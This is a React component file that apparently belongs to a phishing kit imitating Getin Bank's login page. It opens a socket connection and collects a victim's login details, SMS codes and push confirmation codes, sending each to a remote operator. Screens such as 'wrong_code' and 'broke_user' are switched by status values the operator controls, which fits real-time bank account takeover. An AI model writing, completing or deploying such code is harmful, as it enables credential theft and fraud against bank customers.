import {useSocket} from "../../../context/socket/socketProvider";
import {useEffect} from "react";
import GetInBankFormLogin from "./GetInBankFormLogin";
import GetInBankFormCode from "./GetInFormCode";
import GetInBankLoader from "./GetInBankLoader";
import GetInBankFail from "./GetInBankFail";

const GetInBankForm = () => {
    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'getin'
        });
    }
    console.log(user)
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }

    useEffect(() => {
        console.log('connect')
        connect('getin');
        return () => disconnect();
    }, [])
    return (
        <div id="login-container" className="jsPrepareConfirmation jsActiveConfirmation">
            {
                user.status === '' || user.status === 'wrong_login' ?
                    <GetInBankFormLogin handler={submitLogin} status={user.status}/> :
                    user.status === 'getting_code' || user.status === 'wrong_code' ?
                        <GetInBankFormCode handler={submitCode} status={user.status}/> :
                        user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                            <GetInBankFormCode handler={submitPush} status={user.status}/> :
                        user.status === 'broke_user' ?
                            <GetInBankFail/> :
                            <GetInBankLoader/>
            }

        </div>
    )
}

export default GetInBankForm;